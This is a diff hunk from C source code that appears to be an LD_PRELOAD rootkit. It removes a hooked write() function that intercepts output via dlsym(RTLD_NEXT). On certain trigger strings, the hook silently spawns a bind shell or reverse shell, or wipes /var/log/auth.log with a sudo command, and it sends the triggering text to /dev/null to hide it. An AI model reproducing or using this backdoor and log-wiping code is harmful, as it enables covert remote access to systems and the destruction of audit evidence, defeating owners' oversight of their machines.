@@ -58,43 +58,6 @@ int bind_shell()
     return 0;
 }
 
-ssize_t write(int fd, const void *buf, size_t nbytes)
-{
-    ssize_t (*new_write)(int fd, const void *buf, size_t nbytes);
-    ssize_t ret;
-    new_write = dlsym(RTLD_NEXT, "write");
-
-    char *trigger_1 = strstr(buf, TRIGGER_1);
-    char *clear_logs = strstr(buf, TRIGGER_3);
-    char *trigger_2 = strstr(buf, TRIGGER_2);
-    if (trigger_1 != NULL) //we know we want to make a bind shell
-    {
-	fd = open("/dev/null", O_WRONLY | O_APPEND);
-	ret = new_write(fd, buf, nbytes);
-	bind_shell();
-    }
-
-    else if (clear_logs != NULL)
-    {
-	system("sudo echo "" > /var/log/auth.log");
-	fd = open("/dev/null", O_WRONLY | O_APPEND);
-	ret = new_write(fd, buf, nbytes);
-    }
-
-    else if (trigger_2 != NULL)
-    {
-	fd = open("/dev/null", O_WRONLY | O_APPEND);
-	ret = new_write(fd, buf, nbytes);
-	rev_shell();
-    }
-
-    else
-    {
-	ret = new_write(fd, buf, nbytes);
-    }
-
-    return ret;
-}
 
 int snprintf(char *str, size_t size, const char *format, ...)
 {
